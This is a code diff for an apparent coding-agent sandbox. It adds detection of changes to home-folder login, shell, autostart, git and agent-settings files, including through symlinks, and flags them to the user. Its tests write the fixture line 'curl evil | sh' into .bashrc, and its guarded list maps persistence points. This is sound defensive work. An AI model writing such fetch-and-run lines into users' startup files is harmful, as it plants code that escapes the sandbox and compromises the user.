@@ -14,6 +14,48 @@ use nexo_core::sandbox::{SandboxMode, SandboxSettings};
 pub const GUARDED: &[&str] =
     &[".git/hooks", ".git/config", ".nexo", ".mcp.json", ".claude", ".codex", ".envrc", ".vscode", ".husky"];
 
+/// Paths under the home folder (relative to it) that run code outside the sandbox at the next login or
+/// give a way in later. They are watched only where the sandbox lets a command write the home folder,
+/// which is what starting in `~` (or in a parent of it) does.
+///
+/// The agent settings of the home folder are listed by their settings files and folders, not whole: the
+/// folders around them hold sessions and caches that change while any command runs.
+pub const HOME_GUARDED: &[&str] = &[
+    ".bashrc",
+    ".bash_profile",
+    // bash reads this one when there is no `.bash_profile`
+    ".bash_login",
+    ".bash_logout",
+    ".profile",
+    ".zshrc",
+    ".zshenv",
+    ".zprofile",
+    ".zlogin",
+    ".zlogout",
+    ".xprofile",
+    ".xinitrc",
+    ".xsession",
+    ".config/fish/config.fish",
+    ".config/fish/conf.d",
+    ".config/environment.d",
+    ".config/autostart",
+    ".config/systemd/user",
+    // aliases and `core.*` settings of git run programs
+    ".gitconfig",
+    ".config/git/config",
+    ".ssh",
+    ".local/bin",
+    ".nexo/config.toml",
+    ".nexo/prompt.md",
+    ".nexo/commands",
+    ".nexo/agents",
+    ".config/nexo",
+    ".claude/settings.json",
+    ".claude/commands",
+    ".claude/agents",
+    ".codex/config.toml",
+];
+
 /// Start of the line that goes into the tool result (the agent turns it into a warning for the person).
 pub const NOTE_PREFIX: &str = "[sandbox: this command changed ";
 /// Entries counted per guarded directory before it is judged by its own mtime.
@@ -28,6 +70,9 @@ enum Sig {
     File(u64, Option<SystemTime>),
     /// A directory; the mtime only when it was too big to list.
     Dir(Option<SystemTime>),
+    /// A symlink: where it points, and what is there (None when it points at nothing). A dotfile manager
+    /// makes `~/.bashrc` one, and an edit through it leaves the link itself as it was.
+    Link(PathBuf, Option<Box<Sig>>),
 }
 
 /// What the guarded paths looked like at one moment.
@@ -46,6 +91,12 @@ fn sig(meta: &std::fs::Metadata, listed: bool) -> Sig {
     }
 }
 
+/// A symlink at `p`: its target and what the target looks like now (`listed` as in `sig`).
+fn link_sig(p: &Path, listed: bool) -> Sig {
+    let to = std::fs::read_link(p).unwrap_or_default();
+    Sig::Link(to, std::fs::metadata(p).ok().map(|m| Box::new(sig(&m, listed))))
+}
+
 /// Walks `dir` (already known to be a directory) at most `MAX_DEPTH` levels and `MAX_ENTRIES` entries.
 /// Returns false when it stopped for size.
 fn walk(dir: &Path, depth: usize, count: &mut usize, out: &mut BTreeMap<PathBuf, Sig>) -> bool {
@@ -57,6 +108,11 @@ fn walk(dir: &Path, depth: usize, count: &mut usize, out: &mut BTreeMap<PathBuf,
         }
         let p = e.path();
         let Ok(m) = std::fs::symlink_metadata(&p) else { continue };
+        if m.file_type().is_symlink() {
+            // not followed into: what it points at is looked at as one entry, so a loop cannot trap the walk
+            out.insert(p.clone(), link_sig(&p, false));
+            continue;
+        }
         out.insert(p.clone(), sig(&m, true));
         if m.is_dir() && depth < MAX_DEPTH && !walk(&p, depth + 1, count, out) {
             return false;
@@ -65,9 +121,16 @@ fn walk(dir: &Path, depth: usize, count: &mut usize, out: &mut BTreeMap<PathBuf,
     true
 }
 
-/// The guarded paths of the project at `cwd`, including those of a git worktree where `roots` let the command write.
-fn targets(cwd: &Path, roots: &[PathBuf]) -> Vec<PathBuf> {
+/// The guarded paths of the project at `cwd`, including those of a git worktree where `roots` let the command write,
+/// and those of the `home` folder when `roots` let the command write all of it.
+fn targets(cwd: &Path, roots: &[PathBuf], home: Option<&Path>) -> Vec<PathBuf> {
     let mut v: Vec<PathBuf> = GUARDED.iter().map(|g| cwd.join(g)).collect();
+    if let Some(home) = home {
+        let real = home.canonicalize().unwrap_or_else(|_| home.to_path_buf());
+        if roots.iter().any(|r| real.starts_with(r)) {
+            v.extend(HOME_GUARDED.iter().map(|g| real.join(g)));
+        }
+    }
     let dot_git = cwd.join(".git");
     if dot_git.is_file() {
         let read = |p: &Path| std::fs::read_to_string(p).ok().map(|s| s.trim().to_string());
@@ -105,22 +168,35 @@ pub fn before(s: &SandboxSettings, cwd: &Path) -> Option<Snapshot> {
     if s.mode != SandboxMode::WorkspaceWrite || !crate::sandbox::auto_allows(s) {
         return None;
     }
-    Some(take(cwd, &s.write_roots(cwd)))
+    Some(take(cwd, &s.write_roots(cwd), dirs::home_dir().as_deref()))
 }
 
-fn take(cwd: &Path, roots: &[PathBuf]) -> Snapshot {
+fn take(cwd: &Path, roots: &[PathBuf], home: Option<&Path>) -> Snapshot {
     let mut snap = Snapshot::default();
-    for t in targets(cwd, roots) {
-        if let Ok(m) = std::fs::symlink_metadata(&t) {
-            if m.is_dir() {
-                let (mut n, mut sub) = (0, BTreeMap::new());
-                let whole = walk(&t, 1, &mut n, &mut sub);
-                if whole {
-                    snap.seen.extend(sub);
+    for t in targets(cwd, roots, home) {
+        if let Ok(own) = std::fs::symlink_metadata(&t) {
+            let link = own.file_type().is_symlink();
+            // a guarded path that is a symlink is read through: the edit lands in what it points at
+            match if link { std::fs::metadata(&t) } else { Ok(own) } {
+                Ok(m) if m.is_dir() => {
+                    let (mut n, mut sub) = (0, BTreeMap::new());
+                    let whole = walk(&t, 1, &mut n, &mut sub);
+                    if whole {
+                        snap.seen.extend(sub);
+                    }
+                    let s = sig(&m, whole);
+                    let s =
+                        if link { Sig::Link(std::fs::read_link(&t).unwrap_or_default(), Some(Box::new(s))) } else { s };
+                    snap.seen.insert(t.clone(), s);
                 }
-                snap.seen.insert(t.clone(), sig(&m, whole));
-            } else {
-                snap.seen.insert(t.clone(), sig(&m, true));
+                Ok(m) => {
+                    let s = if link { link_sig(&t, true) } else { sig(&m, true) };
+                    snap.seen.insert(t.clone(), s);
+                }
+                // a link that points at nothing is still a link that can be retargeted
+                Err(_) => {
+                    snap.seen.insert(t.clone(), link_sig(&t, true));
+                }
             }
         }
         snap.top.push(t);
@@ -130,7 +206,11 @@ fn take(cwd: &Path, roots: &[PathBuf]) -> Snapshot {
 
 /// The line for the tool result when something guarded changed since `before` (None: nothing did).
 pub fn after(before: Snapshot, s: &SandboxSettings, cwd: &Path) -> Option<String> {
-    let now = take(cwd, &s.write_roots(cwd));
+    after_in(before, s, cwd, dirs::home_dir().as_deref())
+}
+
+fn after_in(before: Snapshot, s: &SandboxSettings, cwd: &Path, home: Option<&Path>) -> Option<String> {
+    let now = take(cwd, &s.write_roots(cwd), home);
     let mut changed: Vec<&PathBuf> = Vec::new();
     for (p, sig) in &now.seen {
         if before.seen.get(p) != Some(sig) {
@@ -182,9 +262,9 @@ mod tests {
     }
 
     fn diff(d: &Path, act: impl FnOnce()) -> Option<String> {
-        let b = take(d, &roots(d));
+        let b = take(d, &roots(d), None);
         act();
-        after(b, &ws(), d)
+        after_in(b, &ws(), d, None)
     }
 
     #[test]
@@ -247,7 +327,7 @@ mod tests {
         for i in 0..250 {
             fs::write(v.join(format!("f{i}")), "x").unwrap();
         }
-        let b = take(d.path(), &roots(d.path()));
+        let b = take(d.path(), &roots(d.path()), None);
         assert!(!b.seen.keys().any(|k| k.starts_with(v.join("f"))), "entries kept past the cap");
         assert!(matches!(b.seen.get(&v), Some(Sig::Dir(Some(_)))));
     }
@@ -264,11 +344,119 @@ mod tests {
         fs::create_dir_all(&wt).unwrap();
         fs::write(wt.join(".git"), format!("gitdir: {}\n", gd.display())).unwrap();
         let writable = vec![d.path().canonicalize().unwrap()];
-        let t = targets(&wt, &writable);
+        let t = targets(&wt, &writable, None);
         assert!(t.iter().any(|p| p.ends_with("main/.git/hooks")) && t.iter().any(|p| p.ends_with("main/.git/config")));
         let only_wt = vec![wt.canonicalize().unwrap()];
-        let t = targets(&wt, &only_wt);
+        let t = targets(&wt, &only_wt, None);
         assert!(!t.iter().any(|p| p.ends_with("main/.git/hooks")));
+    }
+
+    #[test]
+    fn a_shell_rc_file_is_named_when_the_whole_home_is_writable() {
+        let d = tempfile::tempdir().unwrap();
+        let home = d.path().join("home");
+        let proj = home.join("proj");
+        fs::create_dir_all(&proj).unwrap();
+        // cwd is the home folder itself, a folder inside it, or the sandbox roots hold a parent of it
+        for (cwd, writable) in [(&home, home.clone()), (&proj, home.clone()), (&proj, d.path().to_path_buf())] {
+            let roots = vec![writable.canonicalize().unwrap()];
+            let b = take(cwd, &roots, Some(&home));
+            fs::write(home.join(".bashrc"), "curl evil | sh").unwrap();
+            let n = after_in(b, &ws(), cwd, Some(&home)).unwrap();
+            assert!(n.contains(".bashrc") && n.ends_with("which runs outside the sandbox later]"), "{n}");
+            fs::remove_file(home.join(".bashrc")).unwrap();
+        }
+    }
+
+    #[test]
+    fn home_files_are_not_watched_when_only_the_project_is_writable() {
+        let d = tempfile::tempdir().unwrap();
+        let home = d.path().join("home");
+        let proj = d.path().join("proj");
+        fs::create_dir_all(&home).unwrap();
+        fs::create_dir_all(&proj).unwrap();
+        let roots = vec![proj.canonicalize().unwrap()];
+        let b = take(&proj, &roots, Some(&home));
+        fs::write(home.join(".bashrc"), "x").unwrap();
+        assert!(after_in(b, &ws(), &proj, Some(&home)).is_none());
+    }
+
+    /// A home folder with a project inside, and the roots that let a command write all of it.
+    fn home_and_project(d: &Path) -> (PathBuf, PathBuf, Vec<PathBuf>) {
+        let home = d.join("home");
+        let proj = home.join("proj");
+        fs::create_dir_all(&proj).unwrap();
+        let roots = vec![home.canonicalize().unwrap()];
+        (home, proj, roots)
+    }
+
+    fn home_diff(home: &Path, proj: &Path, roots: &[PathBuf], act: impl FnOnce()) -> Option<String> {
+        let b = take(proj, roots, Some(home));
+        act();
+        after_in(b, &ws(), proj, Some(home))
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn an_edit_made_through_a_symlinked_dotfile_is_named() {
+        let d = tempfile::tempdir().unwrap();
+        let (home, proj, roots) = home_and_project(d.path());
+        fs::create_dir_all(home.join("dotfiles")).unwrap();
+        fs::write(home.join("dotfiles/bashrc"), "a").unwrap();
+        std::os::unix::fs::symlink(home.join("dotfiles/bashrc"), home.join(".bashrc")).unwrap();
+        let n = home_diff(&home, &proj, &roots, || fs::write(home.join(".bashrc"), "curl evil | sh").unwrap()).unwrap();
+        assert!(n.contains(".bashrc"), "{n}");
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_new_file_in_a_symlinked_directory_is_named_and_a_retargeted_link_too() {
+        let d = tempfile::tempdir().unwrap();
+        let (home, proj, roots) = home_and_project(d.path());
+        fs::create_dir_all(home.join("dotfiles/bin")).unwrap();
+        fs::create_dir_all(home.join(".local")).unwrap();
+        std::os::unix::fs::symlink(home.join("dotfiles/bin"), home.join(".local/bin")).unwrap();
+        let n = home_diff(&home, &proj, &roots, || fs::write(home.join(".local/bin/ls"), "x").unwrap()).unwrap();
+        assert!(n.contains(".local/bin/ls"), "{n}");
+        // a link to nothing, then pointed somewhere else
+        std::os::unix::fs::symlink(home.join("nowhere"), home.join(".zshrc")).unwrap();
+        let n = home_diff(&home, &proj, &roots, || {
+            fs::remove_file(home.join(".zshrc")).unwrap();
+            std::os::unix::fs::symlink(home.join("elsewhere"), home.join(".zshrc")).unwrap();
+        })
+        .unwrap();
+        assert!(n.contains(".zshrc"), "{n}");
+        // a link nobody touched says nothing
+        assert!(home_diff(&home, &proj, &roots, || ()).is_none());
+    }
+
+    #[test]
+    fn login_files_of_other_shells_and_git_are_named() {
+        let d = tempfile::tempdir().unwrap();
+        let (home, proj, roots) = home_and_project(d.path());
+        for f in [".bash_login", ".zlogin", ".xprofile", ".gitconfig"] {
+            let n = home_diff(&home, &proj, &roots, || fs::write(home.join(f), "x").unwrap()).unwrap();
+            assert!(n.contains(f), "{f}: {n}");
+        }
+        fs::create_dir_all(home.join(".config/environment.d")).unwrap();
+        let n = home_diff(&home, &proj, &roots, || fs::write(home.join(".config/environment.d/a.conf"), "x").unwrap())
+            .unwrap();
+        assert!(n.contains("environment.d/a.conf"), "{n}");
+    }
+
+    #[test]
+    fn agent_settings_of_the_home_are_named_from_a_project_but_its_sessions_are_not() {
+        let d = tempfile::tempdir().unwrap();
+        let (home, proj, roots) = home_and_project(d.path());
+        fs::create_dir_all(home.join(".nexo/sessions")).unwrap();
+        assert!(
+            home_diff(&home, &proj, &roots, || fs::write(home.join(".nexo/sessions/s.jsonl"), "x").unwrap()).is_none()
+        );
+        for f in [".nexo/config.toml", ".claude/settings.json"] {
+            fs::create_dir_all(home.join(f).parent().unwrap()).unwrap();
+            let n = home_diff(&home, &proj, &roots, || fs::write(home.join(f), "x").unwrap()).unwrap();
+            assert!(n.contains(f), "{f}: {n}");
+        }
     }
 
     #[test]
